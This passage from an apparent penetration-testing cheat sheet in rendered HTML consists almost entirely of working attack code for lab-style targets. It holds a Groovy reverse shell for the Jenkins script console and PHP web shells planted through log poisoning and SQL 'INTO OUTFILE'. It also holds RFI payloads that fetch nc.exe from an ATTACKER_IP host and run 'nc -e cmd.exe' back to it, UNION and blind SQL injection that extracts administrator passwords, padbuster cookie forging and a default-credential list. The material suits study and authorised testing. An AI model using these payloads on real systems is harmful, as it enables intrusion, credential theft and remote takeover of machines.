<span class="n">java</span><span class="w"> </span><span class="o">-</span><span class="n">jar</span><span class="w"> </span><span class="n">iis_shortname_scanner</span><span class="o">.</span><span class="n">jar</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="mi">20</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">domain</span><span class="o">.</span><span class="n">es</span>

<span class="c1">#Jenkins</span>
<span class="n">JENKINSIP</span><span class="o">/</span><span class="n">PROJECT</span><span class="o">//</span><span class="n">securityRealm</span><span class="o">/</span><span class="n">user</span><span class="o">/</span><span class="n">admin</span>
<span class="n">JENKINSIP</span><span class="o">/</span><span class="n">jenkins</span><span class="o">/</span><span class="n">script</span>

<span class="c1">#Groovy RCE</span>
<span class="n">def</span><span class="w"> </span><span class="n">process</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;cmd /c whoami&quot;</span><span class="o">.</span><span class="n">execute</span><span class="p">();</span><span class="n">println</span><span class="w"> </span><span class="s2">&quot;${process.text}&quot;</span><span class="p">;</span>
<span class="c1">#Groovy RevShell</span>
<span class="nb nb-Type">String</span><span class="w"> </span><span class="n">host</span><span class="o">=</span><span class="s2">&quot;localhost&quot;</span><span class="p">;</span>
<span class="nb nb-Type">int</span><span class="w"> </span><span class="n">port</span><span class="o">=</span><span class="mi">8044</span><span class="p">;</span>
<span class="nb nb-Type">String</span><span class="w"> </span><span class="n">cmd</span><span class="o">=</span><span class="s2">&quot;cmd.exe&quot;</span><span class="p">;</span>
<span class="n">Process</span><span class="w"> </span><span class="n">p</span><span class="o">=</span><span class="n">new</span><span class="w"> </span><span class="n">ProcessBuilder</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span><span class="o">.</span><span class="n">redirectErrorStream</span><span class="p">(</span><span class="bp">true</span><span class="p">)</span><span class="o">.</span><span class="n">start</span><span class="p">();</span><span class="n">Socket</span><span class="w"> </span><span class="n">s</span><span class="o">=</span><span class="n">new</span><span class="w"> </span><span class="n">Socket</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">);</span><span class="n">InputStream</span><span class="w"> </span><span class="n">pi</span><span class="o">=</span><span class="n">p</span><span class="o">.</span><span class="n">getInputStream</span><span class="p">(),</span><span class="n">pe</span><span class="o">=</span><span class="n">p</span><span class="o">.</span><span class="n">getErrorStream</span><span class="p">(),</span><span class="w"> </span><span class="n">si</span><span class="o">=</span><span class="n">s</span><span class="o">.</span><span class="n">getInputStream</span><span class="p">();</span><span class="n">OutputStream</span><span class="w"> </span><span class="n">po</span><span class="o">=</span><span class="n">p</span><span class="o">.</span><span class="n">getOutputStream</span><span class="p">(),</span><span class="n">so</span><span class="o">=</span><span class="n">s</span><span class="o">.</span><span class="n">getOutputStream</span><span class="p">();</span><span class="k">while</span><span class="p">(</span><span class="o">!</span><span class="n">s</span><span class="o">.</span><span class="n">isClosed</span><span class="p">()){</span><span class="k">while</span><span class="p">(</span><span class="n">pi</span><span class="o">.</span><span class="n">available</span><span class="p">()</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span><span class="n">so</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">pi</span><span class="o">.</span><span class="n">read</span><span class="p">());</span><span class="k">while</span><span class="p">(</span><span class="n">pe</span><span class="o">.</span><span class="n">available</span><span class="p">()</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span><span class="n">so</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">pe</span><span class="o">.</span><span class="n">read</span><span class="p">());</span><span class="k">while</span><span class="p">(</span><span class="n">si</span><span class="o">.</span><span class="n">available</span><span class="p">()</span><span class="o">&gt;</span><span class="mi">0</span><span class="p">)</span><span class="n">po</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">si</span><span class="o">.</span><span class="n">read</span><span class="p">());</span><span class="n">so</span><span class="o">.</span><span class="n">flush</span><span class="p">();</span><span class="n">po</span><span class="o">.</span><span class="n">flush</span><span class="p">();</span><span class="n">Thread</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">50</span><span class="p">);</span><span class="n">try</span><span class="w"> </span><span class="p">{</span><span class="n">p</span><span class="o">.</span><span class="n">exitValue</span><span class="p">();</span><span class="k">break</span><span class="p">;}</span><span class="n">catch</span><span class="w"> </span><span class="p">(</span><span class="n">Exception</span><span class="w"> </span><span class="n">e</span><span class="p">){}};</span><span class="n">p</span><span class="o">.</span><span class="n">destroy</span><span class="p">();</span><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">();</span>

<span class="c1"># Joomscan</span>
<span class="n">joomscan</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w">  </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span>
<span class="n">joomscan</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w">  </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.11</span><span class="o">.</span><span class="mf">1.111</span><span class="w"> </span><span class="o">--</span><span class="n">enumerate</span><span class="o">-</span><span class="n">components</span>

<span class="c1"># PHP bypass disable_functions and open_basedir</span>
<span class="c1"># Chankro</span>
<span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">TarlogicSecurity</span><span class="o">/</span><span class="n">Chankro</span>
<span class="n">python2</span><span class="w"> </span><span class="n">chankro</span><span class="o">.</span><span class="n">py</span><span class="w"> </span><span class="o">--</span><span class="n">arch</span><span class="w"> </span><span class="mi">64</span><span class="w"> </span><span class="o">--</span><span class="n">input</span><span class="w"> </span><span class="n">rev</span><span class="o">.</span><span class="n">sh</span><span class="w"> </span><span class="o">--</span><span class="n">output</span><span class="w"> </span><span class="n">chan</span><span class="o">.</span><span class="n">php</span><span class="w"> </span><span class="o">--</span><span class="n">path</span><span class="w"> </span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">html</span>

<span class="c1"># Cookies error padding:</span>
<span class="c1"># Get cookie structure</span>
<span class="n">padbuster</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">1.111</span><span class="o">/</span><span class="n">index</span><span class="o">.</span><span class="n">php</span><span class="w"> </span><span class="n">xDwqvSF4SK1BIqPxM9fiFxnWmF</span><span class="o">+</span><span class="n">wjfka</span><span class="w"> </span><span class="mi">8</span><span class="w"> </span><span class="o">-</span><span class="n">cookies</span><span class="w"> </span><span class="s2">&quot;user=xDwqvSF4SK1BIqPxM9fiFxnWmF+wjfka&quot;</span><span class="w"> </span><span class="o">-</span><span class="n">error</span><span class="w"> </span><span class="s2">&quot;Invalid padding&quot;</span>
<span class="c1"># Get cookie for other user (impersonation)</span>
<span class="n">padbuster</span><span class="w"> </span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">1.111</span><span class="o">/</span><span class="n">index</span><span class="o">.</span><span class="n">php</span><span class="w"> </span><span class="n">xDwqvSF4SK1BIqPxM9fiFxnWmF</span><span class="o">+</span><span class="n">wjfka</span><span class="w"> </span><span class="mi">8</span><span class="w"> </span><span class="o">-</span><span class="n">cookies</span><span class="w"> </span><span class="s2">&quot;user=xDwqvSF4SK1BIqPxM9fiFxnWmF+wjfka&quot;</span><span class="w"> </span><span class="o">-</span><span class="n">error</span><span class="w"> </span><span class="s2">&quot;Invalid padding&quot;</span><span class="w"> </span><span class="o">-</span><span class="n">plaintext</span><span class="w"> </span><span class="s1">&#39;user=administratorme&#39;</span>
</code></pre></div>

<h3>Default/Weak login</h3>
<p>Search documentation for default passwords and test them</p>
<div class="highlight"><pre><span></span><code><span class="n">site</span><span class="o">:</span><span class="n">webapplication</span><span class="o">.</span><span class="na">com</span><span class="w"> </span><span class="n">password</span>
</code></pre></div>

<div class="highlight"><pre><span></span><code><span class="nv">admin</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="nv">admin</span>
<span class="nv">admin</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="nv">password</span>
<span class="nv">admin</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="nv">admin12345</span>
<span class="nv">admin</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="nv">letmeinplease</span>
<span class="nv">admin</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">blank</span><span class="o">&gt;</span>
<span class="nv">admin</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">servicename</span><span class="o">&gt;</span>
<span class="nv">admin</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">name</span><span class="w"> </span><span class="nv">of</span><span class="w"> </span><span class="nv">the</span><span class="w"> </span><span class="nv">box</span><span class="o">&gt;</span>
<span class="nv">administrator</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="nv">admin</span>
<span class="nv">user</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="nv">user</span>
<span class="nv">user</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="mi">12345</span>
<span class="nv">user</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="nv">password</span>
<span class="nv">guest</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="nv">guest</span>
<span class="nv">root</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="nv">root</span>
<span class="nv">root</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="nv">admin</span>
<span class="nv">root</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="nv">password</span>
<span class="nv">root</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">servicename</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nv">username</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="nv">you</span><span class="w"> </span><span class="nv">have</span><span class="o">&gt;</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="nv">password</span>
<span class="o">&lt;</span><span class="nv">username</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="nv">you</span><span class="w"> </span><span class="nv">have</span><span class="o">&gt;</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="nv">admin</span>
<span class="o">&lt;</span><span class="nv">username</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="nv">you</span><span class="w"> </span><span class="nv">have</span><span class="o">&gt;</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="nv">username</span>
<span class="nv">username</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">servicename</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nv">name</span><span class="w"> </span><span class="nv">of</span><span class="w"> </span><span class="nv">the</span><span class="w"> </span><span class="nv">box</span><span class="o">&gt;</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">name</span><span class="w"> </span><span class="nv">of</span><span class="w"> </span><span class="nv">the</span><span class="w"> </span><span class="nv">box</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="nv">name</span><span class="w"> </span><span class="nv">of</span><span class="w"> </span><span class="nv">the</span><span class="w"> </span><span class="nv">service</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="nv">application</span><span class="o">&gt;</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">name</span><span class="w"> </span><span class="nv">of</span><span class="w"> </span><span class="nv">the</span><span class="w"> </span><span class="nv">service</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="nv">application</span><span class="o">&gt;</span>
<span class="nv">default</span><span class="w"> </span><span class="nv">account</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="o">&lt;</span><span class="nv">name</span><span class="w"> </span><span class="nv">of</span><span class="w"> </span><span class="nv">the</span><span class="w"> </span><span class="nv">application</span><span class="o">&gt;</span>
</code></pre></div>

<h3>LFI/RFI</h3>
<div class="highlight"><pre><span></span><code><span class="nx">fimap</span><span class="w"> </span><span class="o">-</span><span class="nx">u</span><span class="w"> </span><span class="s2">&quot;http://10.11.1.111/example.php?test=&quot;</span>

<span class="err">#</span><span class="w"> </span><span class="nx">Ordered</span><span class="w"> </span><span class="nx">output</span>
<span class="nx">curl</span><span class="w"> </span><span class="o">-</span><span class="nx">s</span><span class="w"> </span><span class="nx">http</span><span class="o">:</span><span class="c1">//10.11.1.111/gallery.php?page=/etc/passwd</span>
<span class="err">/root/Tools/Kadimus/kadimus -u http://10.11.1.111/example.php?page=</span>

<span class="nx">http</span><span class="o">:</span><span class="c1">//10.11.1.111/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd &amp;&amp; base64 -d savefile.php</span>
<span class="nx">http</span><span class="o">:</span><span class="c1">//10.11.1.111/page=http://10.11.1.111/maliciousfile.txt%00 or ?</span>
<span class="o">?</span><span class="nx">page</span><span class="o">=</span><span class="nx">php</span><span class="o">:</span><span class="c1">//filter/convert.base64-encode/resource=../config.php</span>

<span class="nx">file</span><span class="o">=</span><span class="nx">C</span><span class="o">:</span><span class="err">\</span><span class="nx">windows</span><span class="err">\</span><span class="nx">system32</span><span class="err">\</span><span class="nx">drivers</span><span class="err">\</span><span class="nx">etc</span><span class="err">\</span><span class="nx">hosts</span><span class="w">  </span><span class="err">#</span><span class="nx">Windows</span><span class="w"> </span><span class="nx">file</span>

<span class="nx">amap</span><span class="w"> </span><span class="o">-</span><span class="nx">d</span><span class="w"> </span><span class="mf">10.11.1.111</span><span class="w"> </span><span class="mf">8000</span>

<span class="err">#</span><span class="w"> </span><span class="nx">LFI</span><span class="w"> </span><span class="nx">Windows</span>

<span class="nx">http</span><span class="o">:</span><span class="c1">//10.11.1.111/addguestbook.php?LANG=../../windows/system32/drivers/etc/hosts%00</span>

<span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="p">..</span><span class="o">/</span><span class="nx">boot</span><span class="p">.</span><span class="nx">ini</span><span class="w">  </span><span class="err">#</span><span class="nx">Windows</span><span class="w"> </span><span class="nx">file</span>


<span class="err">#</span><span class="w"> </span><span class="nx">Contaminating</span><span class="w"> </span><span class="nx">log</span><span class="w"> </span><span class="nx">files</span>

<span class="nx">root</span><span class="err">@</span><span class="nx">kali</span><span class="o">:~</span><span class="err">#</span><span class="w"> </span><span class="nx">nc</span><span class="w"> </span><span class="o">-</span><span class="nx">v</span><span class="w"> </span><span class="mf">10.11.1.111</span><span class="w"> </span><span class="mf">80</span>
<span class="mf">10.11.1.111</span><span class="o">:</span><span class="w"> </span><span class="nx">inverse</span><span class="w"> </span><span class="nx">host</span><span class="w"> </span><span class="nx">lookup</span><span class="w"> </span><span class="nx">failed</span><span class="o">:</span><span class="w"> </span><span class="nx">Unknown</span><span class="w"> </span><span class="nx">host</span>
<span class="p">(</span><span class="nx">UNKNOWN</span><span class="p">)</span><span class="w"> </span><span class="p">[</span><span class="mf">10.11.1.111</span><span class="p">]</span><span class="w"> </span><span class="mf">80</span><span class="w"> </span><span class="p">(</span><span class="nx">http</span><span class="p">)</span><span class="w"> </span><span class="nx">open</span>
<span class="w"> </span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span><span class="cp">?&gt;</span>

<span class="nx">http</span><span class="o">:</span><span class="c1">//10.11.1.111/addguestbook.php?LANG=../../xampp/apache/logs/access.log%00&amp;cmd=ipconfig  #Will work if directory traversal is available.</span>

<span class="err">#</span><span class="w"> </span><span class="nx">RFI</span><span class="o">:</span>
<span class="nx">http</span><span class="o">:</span><span class="c1">//10.11.1.111/addguestbook.php?LANG=http://10.11.1.111:31/evil.txt%00</span>
<span class="nx">Content</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="nx">evil</span><span class="p">.</span><span class="nx">txt</span><span class="o">:</span>
<span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="s2">&quot;nc.exe 10.11.0.105 4444 -e cmd.exe&quot;</span><span class="p">)</span> <span class="cp">?&gt;</span>

<span class="err">#</span><span class="w"> </span><span class="nx">PHP</span><span class="w"> </span><span class="nx">Filter</span><span class="o">:</span>
<span class="nx">http</span><span class="o">:</span><span class="c1">//10.11.1.111/index.php?m=php://filter/convert.base64-encode/resource=config</span>

<span class="err">#</span><span class="w"> </span><span class="nx">RFI</span><span class="w"> </span><span class="nx">over</span><span class="w"> </span><span class="nx">SMB</span><span class="w"> </span><span class="p">(</span><span class="nx">Windows</span><span class="p">)</span>
<span class="nx">cat</span><span class="w"> </span><span class="nx">php_cmd</span><span class="p">.</span><span class="nx">php</span>
<span class="w">    </span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span><span class="cp">?&gt;</span>
<span class="o">-</span><span class="w"> </span><span class="nx">Start</span><span class="w"> </span><span class="nx">SMB</span><span class="w"> </span><span class="nx">Server</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="nx">attacker</span><span class="w"> </span><span class="nx">machine</span><span class="w"> </span><span class="nx">and</span><span class="w"> </span><span class="nx">put</span><span class="w"> </span><span class="nx">evil</span><span class="w"> </span><span class="nx">script</span>
<span class="o">-</span><span class="w"> </span><span class="nx">Access</span><span class="w"> </span><span class="nx">it</span><span class="w"> </span><span class="nx">via</span><span class="w"> </span><span class="nx">browser</span><span class="w"> </span><span class="p">(</span><span class="mf">2</span><span class="w"> </span><span class="nx">request</span><span class="w"> </span><span class="nx">attack</span><span class="p">)</span><span class="o">:</span>
<span class="w">    </span><span class="o">-</span><span class="w"> </span><span class="nx">http</span><span class="o">:</span><span class="c1">//10.11.1.111/blog/?lang=\\ATTACKER_IP\ica\php_cmd.php&amp;cmd=powershell -c Invoke-WebRequest -Uri &quot;http://10.10.14.42/nc.exe&quot; -OutFile &quot;C:\\windows\\system32\\spool\\drivers\\color\\nc.exe&quot;</span>
<span class="w">    </span><span class="o">-</span><span class="w"> </span><span class="nx">http</span><span class="o">:</span><span class="c1">//10.11.1.111/blog/?lang=\\ATTACKER_IP\ica\php_cmd.php&amp;cmd=powershell -c &quot;C:\\windows\\system32\\spool\\drivers\\color\\nc.exe&quot; -e cmd.exe ATTACKER_IP 1234</span>
</code></pre></div>

<h3>SQL-Injection</h3>
<div class="highlight"><pre><span></span><code><span class="c1"># References</span>
<span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">portswigger</span><span class="o">.</span><span class="n">net</span><span class="o">/</span><span class="n">web</span><span class="o">-</span><span class="n">security</span><span class="o">/</span><span class="n">sql</span><span class="o">-</span><span class="n">injection</span>
<span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">portswigger</span><span class="o">.</span><span class="n">net</span><span class="o">/</span><span class="n">web</span><span class="o">-</span><span class="n">security</span><span class="o">/</span><span class="n">sql</span><span class="o">-</span><span class="n">injection</span><span class="o">/</span><span class="n">cheat</span><span class="o">-</span><span class="n">sheet</span>
<span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="o">.</span><span class="n">exploit</span><span class="o">-</span><span class="n">db</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">papers</span><span class="o">/</span><span class="mi">17934</span>
<span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">swisskyrepo</span><span class="o">/</span><span class="n">PayloadsAllTheThings</span><span class="o">/</span><span class="n">tree</span><span class="o">/</span><span class="k">master</span><span class="o">/</span><span class="n">SQL</span><span class="o">%</span><span class="mi">20</span><span class="n">Injection</span>
<span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">book</span><span class="o">.</span><span class="n">hacktricks</span><span class="o">.</span><span class="n">xyz</span><span class="o">/</span><span class="n">pentesting</span><span class="o">-</span><span class="n">web</span><span class="o">/</span><span class="n">sql</span><span class="o">-</span><span class="n">injection</span>
<span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">pentestwiki</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">sql</span><span class="o">-</span><span class="n">injection</span><span class="o">/</span><span class="w"> </span>
<span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="o">.</span><span class="n">tarlogic</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">blog</span><span class="o">/</span><span class="n">red</span><span class="o">-</span><span class="n">team</span><span class="o">-</span><span class="n">tales</span><span class="o">-</span><span class="mh">0x01</span><span class="o">/</span>

<span class="c1"># Enumeration</span>

<span class="s1">&#39; ORDER BY 1--      #Increase the number to determine the number of columns</span>
<span class="s1">&#39; UNION SELECT NULL,NULL,NULL--   #Confirm the &quot;Order by&quot; statement </span>
<span class="s1">&#39; UNION SELECT NULL,NULL,&#39;</span><span class="n">a</span><span class="s1">&#39;,NULL-- #Define string/numerical data</span>

<span class="c1"># Database Attacks</span>
<span class="s1">&#39;+UNION+SELECT+@@version,+NULL#</span>
<span class="n">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="n">FROM</span><span class="w"> </span><span class="n">information_schema</span><span class="o">.</span><span class="n">tables</span>

<span class="n">SHOW</span><span class="w"> </span><span class="n">GRANTS</span><span class="p">;</span><span class="w">  </span><span class="c1">#Get current user permissions</span>

<span class="n">SHOW</span><span class="w"> </span><span class="n">VARIABLES</span><span class="p">;</span><span class="w"> </span><span class="c1">#Get variables related to the environment</span>

<span class="n">select</span><span class="w"> </span><span class="err">@@</span><span class="n">hostname</span><span class="p">,</span><span class="w"> </span><span class="err">@@</span><span class="n">tmpdir</span><span class="p">,</span><span class="w"> </span><span class="err">@@</span><span class="n">version</span><span class="p">,</span><span class="w"> </span><span class="err">@@</span><span class="n">version_compile_machine</span><span class="p">,</span><span class="w"> </span><span class="err">@@</span><span class="n">plugin_dir</span><span class="p">;</span><span class="w"> </span><span class="c1">#MySQL database enumeration query</span>

<span class="s1">&#39;+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--  #List Tables</span>

<span class="s1">&#39;+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name=&#39;</span><span class="n">users_abcdef</span><span class="s1">&#39;--  #List Columns</span>

<span class="s1">&#39;+UNION+SELECT+username,+password+FROM+users--    #Get Username &amp; Password</span>

<span class="s1">&#39;+UNION+SELECT+NULL,username||&#39;</span><span class="o">~</span><span class="s1">&#39;||password+FROM+users--     #Concatenation for multiple vaules</span>

<span class="c1"># SQL Web Shell</span>
<span class="s1">&#39;UNION SELECT &quot;&lt;?php echo passthru($_GET[&#39;</span><span class="n">cmd</span><span class="s1">&#39;]);?&gt;&quot; INTO OUTFILE &#39;</span><span class="n">C</span><span class="p">:</span><span class="o">/</span><span class="n">xampp</span><span class="o">/</span><span class="n">htdocs</span><span class="o">/</span><span class="n">command</span><span class="o">.</span><span class="n">php</span><span class="s1">&#39;&gt;) #MedJed</span>

<span class="c1"># Blind Enumeration (https://auspisec.com/blog/20220118/proving_grounds_butch_walkthrough.html)</span>
<span class="n">TrackingId</span><span class="w"> </span><span class="o">=</span><span class="n">u5YD3PapBcR4lN3e7Tj4</span><span class="s1">&#39; AND &#39;</span><span class="mi">1</span><span class="s1">&#39;=&#39;</span><span class="mi">1</span><span class="w">    </span><span class="c1">#Test w/ a condition based injection (True or False)</span>

<span class="s1">&#39; IF (1=1) WAITFOR DELAY &#39;</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">10</span><span class="s1">&#39;;--  #Evaluates to true and waits 10 secs (Time Delay based)</span>

<span class="s1">&#39; IF ((select count(name) from sys.tables where name = &#39;</span><span class="n">users</span><span class="s1">&#39;)=1) WAITFOR DELAY &#39;</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">10</span><span class="s1">&#39;;--  #This query uses Boolean to guess the table name of a database</span>

<span class="s1">&#39; IF ((select count(c.name) from sys.columns c, sys.tables t where c.object_id = t.object_id and t.name = &#39;</span><span class="n">users</span><span class="s1">&#39; and c.name = &#39;</span><span class="n">username</span><span class="s1">&#39;)=1) WAITFOR DELAY &#39;</span><span class="mi">0</span><span class="p">:</span><span class="mi">0</span><span class="p">:</span><span class="mi">10</span><span class="s1">&#39;;-- #This query uses Boolean to guess the column name of a table</span>

<span class="n">TrackingId</span><span class="o">=</span><span class="n">xyz</span><span class="s1">&#39; AND (SELECT &#39;</span><span class="n">a</span><span class="s1">&#39; FROM users LIMIT 1)=&#39;</span><span class="n">a</span><span class="w"> </span><span class="c1">#This query verifies there is table called users.</span>

<span class="n">TrackingId</span><span class="o">=</span><span class="n">xyz</span><span class="s1">&#39; AND (SELECT &#39;</span><span class="n">a</span><span class="s1">&#39; FROM users WHERE username=&#39;</span><span class="n">administrator</span><span class="s1">&#39; AND LENGTH(password)&gt;1)=&#39;</span><span class="n">a</span><span class="w">  </span><span class="c1">#Checks for password length</span>

<span class="n">TrackingId</span><span class="o">=</span><span class="n">xyz</span><span class="s1">&#39; AND (SELECT SUBSTRING(password,3,1) FROM users WHERE username=&#39;</span><span class="n">administrator</span><span class="s1">&#39;)=&#39;</span><span class="err">§</span><span class="n">a</span><span class="err">§</span><span class="w">  </span><span class="c1">#Use with Burp Sniper, a Simple List Payload, and Grep Match to find the password one character at a time incrementing to total length.</span>

<span class="n">TrackingId</span><span class="w"> </span><span class="o">=</span><span class="n">u5YD3PapBcR4lN3e7Tj4</span><span class="s1">&#39; AND SUBSTRING((SELECT Password FROM Users WHERE Username = &#39;</span><span class="n">Administrator</span><span class="s1">&#39;), 1, 1) &gt; &#39;</span><span class="n">m</span><span class="w"> </span><span class="c1">#This query checks to narrow the first letter of the &#39;Admin&#39; password</span>

<span class="c1"># Blind Oracle sqli (https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)</span>
<span class="w"> </span><span class="n">TrackingId</span><span class="o">=</span><span class="n">Vqg7K1mFWH8hNMMb</span><span class="s1">&#39;||(SELECT+CASE+WHEN+SUBSTR(password,§1§,1)=&#39;</span><span class="err">§</span><span class="n">a</span><span class="err">§</span><span class="s1">&#39;+THEN+TO_CHAR(1/0)+ELSE+NULL+END+FROM+users+WHERE+username</span><span class="si">%3d</span><span class="s1">+&#39;</span><span class="n">administrator</span><span class="s1">&#39;)||&#39;</span><span class="w">  </span><span class="c1"># Used Burp Cluster bomb to iterate through the length of the password and simplelist.</span>

<span class="w"> </span><span class="c1">#Time-Delay SQLi</span>

<span class="w"> </span><span class="n">TrackingId</span><span class="o">=</span><span class="n">jSeXZLJoesz7M9ZH</span><span class="s1">&#39;||pg_sleep(10)--   #The key here is to conactenat the normal query w/ the sleep payload as it is generally processed synchronously by the application.</span>

<span class="n">TrackingId</span><span class="o">=</span><span class="s1">&#39;%3BSELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--   # Validate the payload still works for the delay.</span>

<span class="n">TrackingId</span><span class="o">=</span><span class="s1">&#39;%3BSELECT+CASE+WHEN+(username=&#39;</span><span class="n">administrator</span><span class="s1">&#39;)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--; # Check for &#39;</span><span class="n">administrator</span><span class="s1">&#39; in the &#39;</span><span class="n">users</span><span class="s1">&#39; table</span>

<span class="n">TrackingId</span><span class="o">=</span><span class="s1">&#39;%3BSELECT+CASE+WHEN+(username=&#39;</span><span class="n">administrator</span><span class="s1">&#39;+AND+LENGTH(password) &gt;19)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--  # Check length of PW.</span>

<span class="n">TrackingId</span><span class="o">=</span><span class="s1">&#39;%3BSELECT+CASE+WHEN+(username=&#39;</span><span class="n">administrator</span><span class="s1">&#39;+AND+SUBSTRING(password,20,1)=&#39;</span><span class="err">§</span><span class="n">a</span><span class="err">§</span><span class="s1">&#39;)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--  #Use Sniper to retrieve PW.</span>

<span class="c1"># Post</span>
<span class="o">./</span><span class="n">sqlmap</span><span class="o">.</span><span class="n">py</span><span class="w"> </span><span class="o">-</span><span class="n">r</span><span class="w"> </span><span class="n">search</span><span class="o">-</span><span class="n">test</span><span class="o">.</span><span class="n">txt</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="n">tfUPass</span><span class="w">  </span><span class="c1">#&lt;-p&gt; is the parameter to test in the file</span>
<span class="p">[</span><span class="n">From</span><span class="w"> </span><span class="n">Burp</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">confirm</span><span class="p">]</span><span class="w"> </span><span class="n">POST</span><span class="w"> </span><span class="o">/</span><span class="n">issue</span><span class="o">/</span><span class="n">checkByPriority</span><span class="err">?</span><span class="n">priority</span><span class="o">=</span><span class="n">Normal</span><span class="s1">&#39;+UNION+SELECT+sleep(5);+--+- HTTP/1.1</span>

